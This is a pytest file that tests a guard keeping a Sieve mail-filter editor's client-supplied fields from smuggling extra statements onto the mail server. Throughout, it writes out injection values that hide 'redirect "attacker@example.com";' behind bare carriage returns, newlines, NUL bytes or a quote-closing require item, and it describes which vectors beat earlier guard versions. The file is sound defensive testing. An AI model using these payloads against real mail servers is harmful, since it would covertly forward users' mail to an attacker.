"""
The verbatim path cannot be used to smuggle text (areyousievious-8fg.14).

`source` crosses the wire, so a client can propose any bytes it likes and ask
us to write them to the user's mail server unaltered. The guard re-parses what
it is given: the span must yield exactly this entry and nothing else — no
extra statement, no `require`, no preamble, no tail. It fails CLOSED, so an
entry it cannot vouch for is regenerated rather than trusted.

Run from the backend/ directory:
    cd backend && python -m pytest tests/test_span_injection_guard.py -v
"""

from __future__ import annotations

from pathlib import Path

import pytest
import sieve_transform as st

from tests.conftest import COMPARATOR_3O4, corpus_params
from tests.fakes import FakeScriptStore

BACKEND = Path(__file__).resolve().parent.parent


def _round_tripped(text: str) -> st.Entry:
    """The single entry `text` parses to, span and all."""
    entries = st.parse_sieve(text).entries
    assert len(entries) == 1, entries
    return entries[0]


def test_a_span_the_parser_itself_produced_is_faithful():
    entry = _round_tripped(
        '# --- Spam ---\nif header :contains "subject" "spam" {\n  fileinto "Junk";\n}\n'
    )
    assert st.span_is_faithful(entry)


def test_an_empty_span_is_not_faithful():
    """A Rule the builder minted has nothing to re-emit."""
    assert not st.span_is_faithful(st.Rule(name="New"))


def test_a_span_carrying_a_second_statement_is_refused():
    """The smuggling case: the span parses to the right rule PLUS a command
    the user never wrote. Two entries, so the guard refuses it."""
    entry = _round_tripped("if true {\n  keep;\n}\n")
    entry.source += 'redirect "attacker@example.com";\n'
    assert not st.span_is_faithful(entry)


def test_a_span_carrying_a_require_is_refused():
    entry = _round_tripped("if true {\n  keep;\n}\n")
    entry.source = 'require ["vacation"];\n' + entry.source
    assert not st.span_is_faithful(entry)


# A rule the parser RECOGNISES. `if true { ... }` is a RawBlock — `true` is
# not a test the builder can edit — so it has no `.actions` to change, and the
# two tests below are about editing a field of a Rule.
_AN_EDITABLE_RULE = 'if header :contains "subject" "receipt" {\n  fileinto "Junk";\n}\n'


def test_a_span_whose_meaning_differs_from_the_entry_is_refused():
    """The edited-rule case, which is the common one: the client changed the
    folder, so the span no longer describes the entry and must regenerate."""
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.actions[0].argument = "Inbox"
    assert not st.span_is_faithful(entry)


def test_a_reverted_edit_is_faithful_again():
    """Dirty is a comparison, not a flag: changed-and-changed-back is clean."""
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.actions[0].argument = "Inbox"
    entry.actions[0].argument = "Junk"
    assert st.span_is_faithful(entry)


def test_a_raw_block_span_is_guarded_the_same_way():
    entry = _round_tripped('vacation :days 7 "Away";\n')
    assert isinstance(entry, st.RawBlock)
    assert st.span_is_faithful(entry)
    entry.text = "discard;"
    assert not st.span_is_faithful(entry)


def test_a_span_carrying_loose_bytes_after_the_entry_is_refused():
    """Not in the plan's seven; added because deleting the `reparsed.tail`
    term broke none of them, and the term turns out to be load-bearing rather
    than defensive. A comment appended to an honest span re-parses to the same
    single entry — the rule compares equal, so value equality waves it through
    — and the loose bytes ride out verbatim on the back of it."""
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.source += "\n# smuggled trailing note\n"
    assert not st.span_is_faithful(entry)


def test_a_span_carrying_loose_bytes_before_the_entry_is_refused():
    """The other end, and the reason `no requires` does not already cover it:
    `require [];` declares NOTHING, so `reparsed.requires` is empty and that
    check never fires. The statement and the blank lines above it land in
    `preamble` instead, and the rule below re-parses value-equal to this entry
    — so preamble is the only term that refuses it, and without it those bytes
    would be written to the mail server verbatim.

    Blank lines rather than a comment on purpose: a comment here is absorbed as
    the rule's NAME, which makes value equality refuse the span and would leave
    this test passing for a reason that has nothing to do with the preamble.
    """
    entry = _round_tripped(_AN_EDITABLE_RULE)
    entry.source = "\n\nrequire [];\n" + entry.source
    assert not st.span_is_faithful(entry)


# ── The bytes no entry vouches for ──


def test_a_preamble_carrying_a_command_is_refused():
    """`span_is_faithful` guards the entries. The preamble and tail are
    re-emitted verbatim too, and have no entry to be compared against — so
    they get their own guard: they may hold comments and blank lines and the
    `require` statement, and nothing else."""
    script = st.SieveScript(
        requires=["fileinto"],
        preamble='redirect "attacker@example.com";\n',
        requires_source='require ["fileinto"];\n',
    )
    assert st.preflight_error(script) is not None


def test_a_tail_carrying_a_command_is_refused():
    script = st.SieveScript(tail='\nredirect "attacker@example.com";\n')
    assert st.preflight_error(script) is not None


def test_a_requires_source_declaring_more_than_it_says_is_refused():
    """The bytes must agree with the list. Otherwise a client could declare
    `["fileinto"]` on the wire and write `require ["fileinto", "vacation"];`."""
    script = st.SieveScript(
        requires=["fileinto"], requires_source='require ["fileinto", "vacation"];\n'
    )
    assert st.preflight_error(script) is not None


def test_a_script_that_declares_an_extension_but_carries_no_require_bytes_passes():
    """The ordinary save, and the reason the requires check is SUBSET rather
    than equality. A script built in the UI has no `requires_source` — there
    were never any bytes to parse — and the generator renders that line
    canonically from the declared list. An equality check refuses this, which
    is not a guard but a lockout: it refused nine existing tests, including
    `test_saving_rules_stores_generated_sieve`. Do not tighten it back.
    """
    script = st.SieveScript(requires=["fileinto"], requires_source="", preamble="")
    assert st.preflight_error(script) is None


def test_an_honest_preamble_and_tail_pass():
    script = st.SieveScript(
        requires=["fileinto"],
        preamble="# Generated by Roundcube\n\n",
        requires_source='require ["fileinto"];\n',
        tail="\n# end\n",
    )
    assert st.preflight_error(script) is None


def test_several_require_statements_and_the_comment_between_them_pass():
    """`requires_source` is not always one well-formed statement: a file that
    declares its extensions in three goes keeps the comment sitting between
    them in the same span. The head is parsed as ONE unit for exactly this
    reason — anything that checked a single statement would refuse it."""
    script = st.parse_sieve((BACKEND / "test_scripts" / "multiple-requires.sieve").read_text())
    assert script.requires_source.count("require") >= 2, script.requires_source
    assert st.preflight_error(script) is None


def test_a_require_that_arrived_after_an_entry_leaves_the_head_empty():
    """A `require` below the first entry is deliberately routed to a RawBlock
    and its extensions are deliberately NOT harvested — so this script declares
    nothing and has no `requires_source` at all. Both sides of the comparison
    are empty, which is agreement, and the guard must say so."""
    script = st.parse_sieve(
        'if header :contains "subject" "x" {\n  keep;\n}\n\nrequire ["vacation"];\n'
    )
    assert script.requires == []
    assert script.requires_source == ""
    assert st.preflight_error(script) is None


def test_the_endpoint_rejects_a_hostile_preamble_without_writing(authed_client):
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = http.put(
            "/api/scripts/primary",
            json={
                "requires": [],
                "preamble": 'redirect "attacker@example.com";\n',
                "requires_source": "",
                "tail": "",
                "entries": [],
            },
        )
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


def test_the_endpoint_rejects_a_hostile_tail_without_writing(authed_client):
    """The other end of the same hole. `tail` is emitted verbatim on BOTH
    generator paths, so a save that regenerates every entry still writes it."""
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = http.put(
            "/api/scripts/primary",
            json={
                "requires": [],
                "preamble": "",
                "requires_source": "",
                "tail": '\nredirect "attacker@example.com";\n',
                "entries": [],
            },
        )
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


@pytest.mark.parametrize(
    "path",
    corpus_params({"modifiers-comparator-declared.sieve": COMPARATOR_3O4}),
)
def test_no_real_script_is_refused_by_the_boundary_guard(path: Path):
    """A guard that refuses a real script locks a user out of their own
    filters. Every fixture must round-trip through it cleanly.

    This is the test that stops this from being the `.13` failure again: a
    whole-script validator false-rejects forever on any extension sievelib
    lacks. `_boundary_error` runs OUR parser over the head and tail only, so it
    does not inherit that — and 65 real scripts, 42 of which parse to no Rule
    at all, are the evidence rather than the argument.
    """
    assert st.preflight_error(st.parse_sieve(path.read_text())) is None


def test_a_require_statement_split_across_the_preamble_and_the_require_bytes_is_refused():
    """Found by attacking the guard rather than by the plan.

    Joined, these two read as one honest `require ["fileinto"];`. But the
    generator emits `requires_source` ONLY when nothing regenerated — any other
    save writes the preamble against a freshly rendered require line, so what
    goes out is `require ["fileinto"require ["fileinto"];` and the server
    refuses the whole script. Checking the join alone vouched for bytes that
    are never written in that combination; the preamble is checked on its own
    for exactly this.
    """
    script = st.SieveScript(
        requires=["fileinto"],
        preamble='require ["fileinto"',
        requires_source="];\n",
    )
    assert st.preflight_error(script) is not None


# ── Bytes that end a line for the server and not for us ──


_CR_SMUGGLED = '# harmless note\rredirect "attacker@example.com";'


def test_a_bare_carriage_return_in_the_preamble_is_refused():
    """Found by fuzzing this guard, and the only vector that got through it.

    We split lines on "\\n", so the CR is an ordinary character and the whole
    thing is ONE comment — to our parser, to sievelib, and therefore to the
    `.13` pre-flight too. RFC 5228 ends a comment at CRLF and excludes CR from
    its body, so what a server does after that CR is undefined and one reading
    of it runs the redirect. Nothing else in the stack was going to notice.
    """
    assert st.preflight_error(st.SieveScript(preamble=_CR_SMUGGLED + "\n")) is not None


def test_a_bare_carriage_return_in_the_tail_is_refused():
    assert st.preflight_error(st.SieveScript(tail="\n" + _CR_SMUGGLED + "\n")) is not None


def test_a_bare_carriage_return_inside_a_faithful_span_is_refused():
    """The same bytes through the entry door, which `span_is_faithful` cannot
    close on its own. The comment is absorbed as the Rule's NAME, so the span
    re-parses value-equal to the entry it accompanies and the guard vouches for
    it — correctly, by its own rule. This is why the CR check is asked of the
    whole script rather than bolted onto either guard.
    """
    script = st.parse_sieve(_CR_SMUGGLED + '\nif header :contains "subject" "x" {\n  keep;\n}\n')
    assert st.span_is_faithful(script.entries[0]), "premise: the span vouches for itself"
    assert st.preflight_error(script) is not None


def test_a_bare_carriage_return_in_a_canonically_rendered_comment_is_refused():
    """The third door, which predates spans entirely: `RawBlock.comment` is
    written out as a `# ` line by the regenerating path, so a client that never
    sends a `source` at all still gets its bytes onto the mail server."""
    block = st.RawBlock(text="keep;", comment='c\rredirect "attacker@example.com";')
    assert st.preflight_error(st.SieveScript(entries=[block])) is not None


def test_a_bare_carriage_return_in_a_rule_name_is_refused():
    rule = st.Rule(
        name='n\rredirect "attacker@example.com";',
        conditions=[st.Condition(header="subject", match_type="contains", value="x")],
        actions=[st.Action(action_type="keep")],
    )
    assert st.preflight_error(st.SieveScript(entries=[rule])) is not None


def test_crlf_line_endings_are_not_refused():
    """The check is for a LONE carriage return. A script written on Windows, or
    one a server handed back with CRLF endings, has a CR before every LF and
    must still save — refusing it would be the lockout this guard exists to
    avoid, over a file we never had a complaint about.
    """
    script = st.SieveScript(
        requires=["fileinto"],
        preamble="# Generated by Roundcube\r\n\r\n",
        requires_source='require ["fileinto"];\r\n',
        tail="\r\n# end\r\n",
    )
    assert st.preflight_error(script) is None


def test_the_endpoint_rejects_a_smuggled_carriage_return_without_writing(authed_client):
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = http.put(
            "/api/scripts/primary",
            json={
                "requires": [],
                "preamble": _CR_SMUGGLED + "\n",
                "requires_source": "",
                "tail": "",
                "entries": [],
            },
        )
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


_LF_SMUGGLED = 'c\nredirect "attacker@example.com";'


def test_a_line_break_in_a_raw_block_comment_is_refused():
    """The half of door 3 the CR check missed, and the worse half: a bare LF
    needs no reading of the RFC at all. `_canonical_span` interpolates the
    comment into `f"# {comment}\\n{text}"`, so the newline ends the comment and
    the redirect below it is a live statement. It reached the mail server
    through `PUT` with a 200, because a RawBlock never meets the per-rule
    sievelib check — `preflight_error` loops `script.rules`.
    """
    block = st.RawBlock(text="keep;", comment=_LF_SMUGGLED)
    assert st.preflight_error(st.SieveScript(entries=[block])) is not None


def test_a_line_break_in_a_rule_name_is_refused():
    """Same interpolation, `f"# --- {name} ---"`. An ENABLED rule happened to be
    caught by sievelib choking on the orphaned `---`, and a disabled one by the
    same accident — by luck of another checker's grammar rather than by anything
    that meant to refuse it. This means to.
    """
    rule = st.Rule(
        name=_LF_SMUGGLED,
        conditions=[st.Condition(header="subject", match_type="contains", value="x")],
        actions=[st.Action(action_type="keep")],
    )
    assert st.preflight_error(st.SieveScript(entries=[rule])) is not None


def test_a_multi_line_raw_block_body_is_not_refused():
    """The scoping, and the reason the LF check names two fields rather than
    looping every field the CR check does. `RawBlock.text` is many lines by
    definition — every multi-line `vacation` in the corpus is one — and so are
    `source`, `preamble`, `requires_source` and `tail`. Asking the LF question
    of any of them turns this guard into a lockout that refuses nearly every
    real script.
    """
    block = st.RawBlock(text="vacation :days 7 text:\nAway until Monday.\n.\n;", comment="note")
    assert st.preflight_error(st.SieveScript(entries=[block])) is None


def test_a_nul_in_the_preamble_is_refused():
    """RFC 5228's `octet-not-crlf` excludes %x00, so a NUL is never valid Sieve,
    and against a C-implemented server (Dovecot) truncation at the NUL is the
    classic desync — everything after it is the server's problem rather than
    something we can reason about."""
    script = st.SieveScript(preamble='# n\x00redirect "attacker@example.com";\n')
    assert st.preflight_error(script) is not None


def test_a_nul_in_a_comment_or_a_tail_is_refused():
    assert st.preflight_error(st.SieveScript(tail='\n# t\x00redirect "a@b.com";\n')) is not None
    block = st.RawBlock(text="keep;", comment='c\x00redirect "a@b.com";')
    assert st.preflight_error(st.SieveScript(entries=[block])) is not None


def test_a_script_that_already_holds_a_nul_can_still_be_saved():
    """The scoping decision on NUL, and it is a real tradeoff rather than a free
    win. A file with a NUL in it fails to lex and comes back as one whole-file
    RawBlock, with the NUL in `text` and `source` and nowhere else. Refusing it
    there would lock a user out of saving their own file over a byte that was
    already on their server — and re-emitting bytes that are already there
    changes nothing, whereas injecting new ones does. So those two fields are
    exempt, and the injection sites above are not.
    """
    script = st.parse_sieve("keep;\n\x00 broken\n")
    assert isinstance(script.entries[0], st.RawBlock), "premise: this is one raw block"
    assert "\x00" in script.entries[0].text, "premise: the NUL is in text, not the boundary"
    assert st.preflight_error(script) is None


# ── Through the endpoint, which is where the reviewer found these ──


def _put(http, **body):
    return http.put("/api/scripts/primary", json={"requires": [], "entries": [], **body})


def test_the_endpoint_rejects_a_line_break_in_a_raw_comment_without_writing(authed_client):
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = _put(http, entries=[{"kind": "raw", "text": "keep;", "comment": _LF_SMUGGLED}])
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


def test_the_endpoint_rejects_a_line_break_in_a_rule_name_without_writing(authed_client):
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = _put(
            http,
            entries=[
                {
                    "kind": "rule",
                    "name": _LF_SMUGGLED,
                    "enabled": False,
                    "match": "anyof",
                    "conditions": [{"header": "subject", "match_type": "contains", "value": "x"}],
                    "actions": [{"type": "keep"}],
                }
            ],
        )
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


def test_the_endpoint_rejects_a_nul_in_the_preamble_without_writing(authed_client):
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = _put(http, preamble='# n\x00redirect "attacker@example.com";\n')
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


def test_a_nul_above_a_rule_is_refused():
    """The NUL exemption's first scoping was exploitable, and this is the shape
    that broke it.

    `source` is client-supplied and only has to survive `span_is_faithful` — and
    a comment ABOVE a rule rides in the span BY DESIGN, in no compared field. So
    a Rule's `source` is a free-text channel, and exempting it wrote
    `# lead\\x00redirect "attacker@example.com";` to the mail server, 200 and
    byte-identical. The exemption is now a RawBlock's own bytes only.
    """
    hostile = (
        '# lead\x00redirect "attacker@example.com";\n'
        "# --- n ---\n"
        'if header :contains "subject" "x" {\n  keep;\n}\n'
    )
    script = st.parse_sieve(hostile)
    assert isinstance(script.entries[0], st.Rule), "premise: this lexes to a Rule"
    assert script.entries[0].name == "n", "premise: the NUL is in the span, not the name"
    assert st.span_is_faithful(script.entries[0]), "premise: the span vouches for itself"
    assert st.preflight_error(script) is not None


def test_the_endpoint_rejects_a_nul_in_a_rule_span_without_writing(authed_client):
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = _put(
            http,
            entries=[
                {
                    "kind": "rule",
                    "name": "n",
                    "enabled": True,
                    "match": "anyof",
                    "conditions": [{"header": "subject", "match_type": "contains", "value": "x"}],
                    "actions": [{"type": "keep"}],
                    "source": '# lead\x00redirect "attacker@example.com";\n'
                    "# --- n ---\n"
                    'if header :contains "subject" "x" {\n  keep;\n}\n',
                }
            ],
        )
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


# ── A NUL inside a quoted field (areyousievious-gey) ──
#
# The generator escapes these four into quoted strings, which answers STATEMENT
# INJECTION and nothing else. The byte still reaches the mail server, and a
# server that truncates its input at a NUL truncates the WHOLE SCRIPT there —
# every rule after the offending one silently gone, while our UI keeps showing
# them because our own parser is happy with a NUL between quotes. That is
# deletion of a user's filters, which is the worst thing this module can do.


def _script_with(*, header="subject", value="x", comparator="", argument="Junk") -> st.SieveScript:
    """One Rule, varying only the free text the wire admits into a quoted string.

    Built rather than parsed, so it carries no span and takes the REGENERATING
    path — which is the path that puts these four fields on the wire at all.
    """
    return st.SieveScript(
        requires=["fileinto"],
        entries=[
            st.Rule(
                name="n",
                conditions=[
                    st.Condition(header=header, match_type="is", value=value, comparator=comparator)
                ],
                actions=[st.Action(action_type="fileinto", argument=argument)],
            )
        ],
    )


# `header`, `value` and `comparator` are `str` on the wire and `argument` is a
# folder name or an address; the rest of a Condition and an Action are `Literal`
# vocabularies in api_models with no NUL to smuggle. So these four ARE the free
# text, which is why they are the four.
_A_NUL_IN_A_QUOTED_FIELD = [
    pytest.param({"value": "sp\x00am"}, id="condition-value"),
    pytest.param({"argument": "a\x00b"}, id="action-argument"),
    pytest.param({"header": "sub\x00ject"}, id="condition-header"),
    pytest.param({"comparator": "i;ascii\x00numeric"}, id="condition-comparator"),
]


@pytest.mark.parametrize("field", _A_NUL_IN_A_QUOTED_FIELD)
def test_a_nul_in_a_quoted_field_is_refused(field: dict):
    """Including the premise, because the premise is the whole argument: the
    byte survives quoting and lands in the text we would hand the server."""
    script = _script_with(**field)
    assert "\x00" in st.generate_sieve(script), "premise: quoting does not remove the byte"
    assert st.preflight_error(script) == "a NUL would truncate the script for the server"


@pytest.mark.parametrize(
    "field",
    [
        pytest.param({"value": "sp\ram"}, id="cr-in-a-value"),
        pytest.param({"value": "sp\nam"}, id="lf-in-a-value"),
        pytest.param({"argument": "a\rb"}, id="cr-in-an-argument"),
        pytest.param({"argument": "a\nb"}, id="lf-in-an-argument"),
        pytest.param({"header": "sub\rject"}, id="cr-in-a-header"),
    ],
)
def test_a_line_ending_in_a_quoted_field_is_not_refused(field: dict):
    """The narrowness is deliberate and this is what holds it there.

    A line ending inside a quoted string cannot end the statement holding it —
    the statement ends at the closing quote — so what a strict server does with
    it is a LOUD refusal the user sees, not the silent truncation a NUL buys.
    Widening this guard to CR or LF here would refuse a value a user may
    legitimately want; the NUL clause above earns its cost and this does not.
    """
    script = _script_with(**field)
    assert st.preflight_error(script) is None
    # An earlier spelling of this compared one expression to ITSELF, which held
    # for `RawBlock(text="}}}garbage{{{")` too. The property is that the byte
    # survives a parse of what we generated: re-parsing must give back the same
    # text, so nothing was swallowed, split or re-escaped on the way through.
    generated = st.generate_sieve(script)
    assert st.generate_sieve(st.parse_sieve(generated)) == generated, "not a fixed point"


@pytest.mark.parametrize("field", _A_NUL_IN_A_QUOTED_FIELD)
def test_the_endpoint_rejects_a_nul_in_a_quoted_field_without_writing(authed_client, field):
    """Where it matters. A function-level check has missed things here before,
    so the pin is the PUT and an untouched store."""
    cond = {"header": "subject", "match_type": "is", "value": "x"}
    action = {"type": "fileinto", "argument": "Junk"}
    if "argument" in field:
        action["argument"] = field["argument"]
    else:
        cond.update(field)
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = _put(
            http,
            requires=["fileinto"],
            entries=[
                {
                    "kind": "rule",
                    "name": "n",
                    "enabled": True,
                    "match": "anyof",
                    "conditions": [cond],
                    "actions": [action],
                }
            ],
        )
    assert r.status_code == 400, r.text
    # The message, not just the status. A NUL in `comparator` earns a 400 from
    # sievelib's comparator whitelist whether or not this guard exists, so on
    # that param the status alone does not discriminate. The route puts
    # `preflight_error`'s own words in the detail, which does.
    assert "a NUL would truncate the script for the server" in r.text, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


def test_the_endpoint_still_saves_a_script_that_already_holds_a_nul(authed_client):
    """The lockout case the exemption exists for, driven all the way through.

    A NUL that breaks lexing takes the whole file down the `usable == False`
    path, so it comes back as ONE RawBlock carrying the entire text — and a
    RawBlock's own bytes stay exempt, because re-emitting what is already on the
    server changes nothing and `RawBlock.text` grants arbitrary statements by
    design regardless.
    """
    already = "keep;\n\x00 broken\n"
    parsed = st.parse_sieve(already)
    assert isinstance(parsed.entries[0], st.RawBlock), "premise: unlexable, so one raw block"
    store = FakeScriptStore({"primary": already})
    with authed_client(script_store=store) as http:
        r = _put(
            http,
            entries=[
                {
                    "kind": "raw",
                    "text": parsed.entries[0].text,
                    "comment": "",
                    "source": parsed.entries[0].source,
                }
            ],
        )
    assert r.status_code == 200, r.text
    assert store.scripts["primary"] == already, "and it comes back byte-identical"


@pytest.mark.parametrize(
    ("label", "gap"),
    [
        ("two comments", '# a\x00redirect "atk@e.com";\n# b\n'),
        ("a blank line first", '\n# a\x00redirect "atk@e.com";\n# b\n'),
        ("three comments", '# a\x00redirect "atk@e.com";\n# b\n# c\n'),
    ],
)
def test_a_nul_in_a_raw_blocks_leading_gap_is_refused(label: str, gap: str):
    """The same structural fact one level along from the Rule case.

    `parse_sieve` keeps only the LAST comment line as `comment`; earlier lines
    and blank lines stay in `source` and in no compared field, so they need only
    survive `span_is_faithful` — which cannot see them. Only the single-comment
    shape, where the NUL lands in `comment`, was refused before.

    Marginal capability over `RawBlock.text` is nil, since that channel grants
    arbitrary statements by design. What is wrong is that the exemption reached
    further than its own stated reason, and that these bytes sit in no modelled
    field, so they survive parse → display → save invisibly.
    """
    script = st.parse_sieve(gap + 'vacation :days 7 "Away";\n')
    entry = script.entries[0]
    assert isinstance(entry, st.RawBlock), "premise: one raw block"
    assert "\x00" not in entry.comment, "premise: the NUL is in neither compared field"
    assert "\x00" not in entry.text
    assert st.span_is_faithful(entry), "premise: the span vouches for itself"
    assert st.preflight_error(script) is not None


def test_the_endpoint_rejects_a_nul_in_a_raw_blocks_leading_gap(authed_client):
    hostile = '# a\x00redirect "atk@e.com";\n# b\nvacation :days 7 "Away";\n'
    entry = st.parse_sieve(hostile).entries[0]
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = _put(
            http,
            entries=[
                {
                    "kind": "raw",
                    "text": entry.text,
                    "comment": entry.comment,
                    "source": entry.source,
                }
            ],
        )
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


@pytest.mark.parametrize(
    ("label", "text"),
    [
        (
            "above the rule",
            '# lead\x00x\n# --- n ---\nif header :contains "subject" "x" {\n  keep;\n}\n',
        ),
        ("inside a quoted value", 'if header :contains "subject" "sp\x00am" {\n  keep;\n}\n'),
        (
            "a trailing in-body comment",
            'if header :contains "subject" "x" {\n  keep; # z\x00q\n}\n',
        ),
    ],
)
def test_a_nul_anywhere_in_a_rules_span_is_refused(label: str, text: str):
    """The residual cost is the whole class, not the one instance of it that the
    comment used to name. All three lex to a Rule and are faithful; all three are
    refused. That is the cost already accepted for a lone CR, which is refused in
    `source` unconditionally."""
    script = st.parse_sieve(text)
    assert isinstance(script.entries[0], st.Rule), "premise: this lexes to a Rule"
    assert st.span_is_faithful(script.entries[0]), "premise: the span vouches for itself"
    assert st.preflight_error(script) is not None


# ── The reference the checking was done with ──


_REQUIRE_SMUGGLED = 'fileinto"];\nredirect "atk@e.com";\n#'


def test_a_require_item_that_closes_its_own_quote_is_refused():
    """The one client-supplied string the design never thought to check, because
    it is what checking is done WITH: `_boundary_error` holds the head bytes up
    against `script.requires`, so `requires` read as the trusted reference rather
    than as input. `_requires_text` interpolated each item into
    `require ["..."];` unescaped, so an item could close the quote and the
    bracket and write a statement of its own.

    Worse than the two findings before it, not better: no RawBlock, no `source`,
    NO ENTRIES AT ALL — so the ADR-0002 "that channel grants arbitrary statements
    anyway" argument that capped those does not apply here. This is the original
    Task 7 bug — hostile bytes, no entries, 200 — one field along.
    """
    script = st.SieveScript(requires=[_REQUIRE_SMUGGLED], entries=[])
    assert st.preflight_error(script) is not None


def test_an_extension_name_with_a_trailing_newline_is_refused():
    """Found by the fuzzer against the FIRST version of this guard. Python's `$`
    also matches before a trailing newline, so an anchored `match` accepted
    `"elsif\\n"` and rendered `require ["elsif` and `"];` on two lines. The check
    is a `fullmatch` for that reason."""
    assert st.preflight_error(st.SieveScript(requires=["elsif\n"])) is not None


@pytest.mark.parametrize(
    "extension",
    ["fileinto", "vacation-seconds", "imap4flags", "vnd.dovecot.duplicate", "regex"],
)
def test_a_well_formed_extension_name_is_not_refused(extension: str):
    """The check is a SHAPE, not a list of names, so an extension nobody here has
    heard of still saves — `vnd.dovecot.duplicate` is in none of our fixtures.
    A list of known names would be the `.13` lockout wearing a new hat."""
    assert st.preflight_error(st.SieveScript(requires=[extension])) is None


def test_the_endpoint_rejects_a_smuggled_require_item_without_writing(authed_client):
    store = FakeScriptStore({"primary": "keep;\n"})
    with authed_client(script_store=store) as http:
        r = _put(http, requires=[_REQUIRE_SMUGGLED])
    assert r.status_code == 400, r.text
    assert store.scripts == {"primary": "keep;\n"}, "the real script must be untouched"


_RELATIONAL_SPAM_SCORE = (
    'require ["relational", "comparator-i;ascii-numeric", "fileinto"];\n'
    "\n"
    "# --- Spam score ---\n"
    'if header :value "gt" :comparator "i;ascii-numeric" "x-spam-score" "5" {\n'
    '  fileinto "Junk";\n'
    "}\n"
)


def test_a_collation_name_carries_a_semicolon_and_must_still_save():
    """The extension whitelist's own turn at being `.13`, caught in review.

    RFC 5228 §2.7.3 mandates `comparator-<name>` for any collation outside
    `i;octet` and `i;ascii-casemap`, and every RFC 4790 collation name has a `;`
    in it. Leaving `;` out of the class refused `comparator-i;ascii-numeric` —
    so a user with an ordinary relational spam-score rule could open their
    script and never save it again.

    Until this branch no corpus fixture used a relational test, which is why
    the corpus stayed green through it. The corpus is the oracle only for the
    shapes it contains; `match-relational.sieve` was added to close that gap,
    and this test pins the endpoint half of it.
    """
    script = st.parse_sieve(_RELATIONAL_SPAM_SCORE)
    assert "comparator-i;ascii-numeric" in script.requires, "premise: we harvested it"
    assert st.preflight_error(script) is None
    assert st.generate_sieve(script) == _RELATIONAL_SPAM_SCORE, "and it round-trips"


def test_our_own_generated_require_line_survives_our_own_preflight():
    """The self-inflicted half, and the one worth locking: `_compute_requires`
    writes `f"comparator-{cond.comparator}"` itself, so the guard was rejecting
    this generator's own output. A rule built rather than parsed has no span and
    takes the regenerating path, which is what puts that name on the wire.
    """
    rule = st.Rule(
        name="Spam score",
        conditions=[
            st.Condition(
                header="x-spam-score",
                match_type="value",
                value="5",
                comparator="i;ascii-numeric",
            )
        ],
        actions=[st.Action(action_type="fileinto", argument="Junk")],
    )
    generated = st.generate_sieve(st.SieveScript(entries=[rule]))
    assert "comparator-i;ascii-numeric" in generated, "premise: we emit the name ourselves"
    assert st.preflight_error(st.parse_sieve(generated)) is None


@pytest.mark.parametrize(
    "extension",
    [
        "comparator-i;ascii-numeric",
        "comparator-i;octet",
        "x-custom",
        "5group",
        "IMAP4FLAGS",
        "vnd.dovecot.filter",
        "a" * 300,
        "date",
        "index",
    ],
)
def test_a_well_formed_extension_name_is_not_refused_2(extension: str):
    assert st.preflight_error(st.SieveScript(requires=[extension])) is None


def test_the_endpoint_saves_a_relational_rule_with_a_collation(authed_client):
    """All the way through, because a lockout is only real at the endpoint.

    It goes out as a RawBlock: `:value "gt"` is a relational test our builder
    does not model, so the rule lands in the raw path and is re-emitted from its
    span. That is the point rather than a caveat — the extension we cannot model
    is exactly the one whose `require` line we must not refuse.
    """
    script = st.parse_sieve(_RELATIONAL_SPAM_SCORE)
    entry = script.entries[0]
    assert isinstance(entry, st.RawBlock), "premise: a relational test is raw to us"
    store = FakeScriptStore({"primary": _RELATIONAL_SPAM_SCORE})
    with authed_client(script_store=store) as http:
        r = _put(
            http,
            requires=script.requires,
            preamble=script.preamble,
            requires_source=script.requires_source,
            tail=script.tail,
            entries=[
                {
                    "kind": "raw",
                    "text": entry.text,
                    "comment": entry.comment,
                    "source": entry.source,
                }
            ],
        )
    assert r.status_code == 200, r.text
    assert store.scripts["primary"] == _RELATIONAL_SPAM_SCORE, "byte-identical, nothing rewritten"
